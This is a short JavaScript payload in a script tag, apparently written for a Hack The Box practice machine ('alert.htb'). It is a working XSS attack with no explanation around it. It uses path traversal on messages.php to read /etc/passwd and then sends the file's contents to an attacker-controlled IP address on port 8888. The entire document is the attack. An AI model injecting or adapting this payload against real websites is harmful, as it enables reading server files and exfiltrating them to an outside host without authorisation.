<script>
fetch("http://alert.htb/messages.php?file=../../../../etc/passwd")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.xx.xx:8888/?file_content=" + encodeURIComponent(data));
  });
</script>
